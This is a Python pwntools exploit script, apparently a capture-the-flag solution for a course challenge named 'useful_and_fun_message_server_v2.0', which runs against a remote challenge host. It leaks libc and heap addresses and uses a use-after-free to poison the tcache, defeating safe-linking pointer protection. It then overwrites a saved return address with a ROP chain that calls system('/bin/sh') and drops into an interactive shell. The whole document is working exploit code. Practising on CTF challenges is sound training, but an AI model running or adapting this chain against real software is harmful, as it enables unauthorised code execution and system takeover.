from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./useful_and_fun_message_server_v2.0"

LOCAL = False

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    continue
    ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1221)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

def menu(p, option):
    p.recvuntil(b"> ")
    p.sendline(str(option).encode())

def add_message(p, message):
    p.recvuntil(b"> ")
    p.send(message)
    p.recvuntil(b"Message recorded!\n")

def edit_message(p, message_number, message):
    p.recvuntil(b"> ")
    p.sendline(str(message_number).encode())
    p.recvuntil(b"> ")
    p.send(message)

def read_message(p, message_number):
    p.recvuntil(b"> ")
    p.sendline(str(message_number).encode())
    p.recvuntil(b"Your message is ")
    heap_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
    return heap_leak

def protect(address, fwd_address):
    return (address >> 12) ^ fwd_address

# Get the address of printf from the server and calculate the libc base address
p.recvuntil(b"helpful message: ")
leaked_printf = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f'printf_address: {hex(leaked_printf)}')

# Get the address of printf from the server and calculate the libc base address
p.recvuntil(b"helpful message: ")
leaked_environ = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f'__environ_address: {hex(leaked_environ)}')

libc_elf = ELF(libc)
libc_elf.address = leaked_printf - libc_elf.symbols.printf
print(f'libc.address: {hex(libc_elf.address)}')

bin_sh_address = next(libc_elf.search(b"/bin/sh"))
print(f'bin sh address: {hex(bin_sh_address)}')

system = libc_elf.symbols.system
print(f'system: {hex(system)}')

rip_address = leaked_environ - 0x158
print(f'edit_rip_address: {hex(rip_address)}')


# Start interacting with the binary
menu(p, 1) # add_message
add_message(p, b"A" * 0x40)  # message 1
menu(p, 4) # send messages
menu(p,  2) # read message
heap_leak = read_message(p, 0)
heap_leak = heap_leak << 12
print(f'heap base address: {hex(heap_leak)}')

memory_allocation = 0x48 + 0x8 # Allocated size of the memory + metadata
tcache_size = 0x290 + 0x10
chunk_1 = heap_leak + tcache_size
print(f'chunk_1: {hex(chunk_1)}')
chunk_2 = chunk_1 + memory_allocation
print(f'chunk_2: {hex(chunk_2)}')

menu(p, 1) # add_message
add_message(p, b"A" * 0x40)  # message 1
menu(p, 1) # add_message
add_message(p, b"B" * 0x40)  # message 2
menu(p, 4) # send messages

target_address = protect(chunk_1, rip_address)
print(f'target_address: {hex(target_address)}')
menu(p, 3) # edit message
edit_message(p, 1, p64(target_address))

menu(p, 1) # add_message
add_message(p, b"C" * 0x40)  # message 3

libc_rop = ROP(libc)

chain = [
    libc_rop.ret.address + libc_elf.address,
    libc_rop.rdi.address + libc_elf.address,
    bin_sh_address,
    system
    ]

menu(p, 1)
add_message(p, b"A" * 0x8 + b"".join([p64(c) for c in chain]))

p.interactive()